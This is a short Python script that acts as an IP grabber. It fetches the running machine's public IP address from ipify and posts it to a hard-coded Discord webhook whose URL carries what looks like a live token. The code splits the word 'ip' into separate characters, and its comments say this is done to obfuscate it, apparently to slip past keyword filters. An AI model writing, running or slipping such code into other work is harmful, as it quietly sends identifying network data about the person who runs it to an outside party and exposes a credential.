import requests

# Splitting the word to obfuscate it
i, p = 'i', 'p'

# Concatenating the strings to form the original word when used
url = f'https://api.{i+p}ify.org'

# Fetching the IP address
ip_address = requests.get(url).text

# Preparing the payload with the obfuscated word
payload = {
    'content': f'My {i+p} Address is {ip_address}'
}

# Obfuscating the Discord webhook URL
webhook_url = 'https://discord.com/api/webhooks/1210812037630926928/p2nsZZw13Zvau5WBGaDGoVZSB-Esx4uv_Riy0n5nZBOuBPNpI8sXJhZC13zOUcoG4wVW'

# Sending the payload to the obfuscated URL
response = requests.post(webhook_url, json=payload)

# Checking the response status
if response.status_code == 200:
    print('Accepted')
else:
    print('Declined or Error')
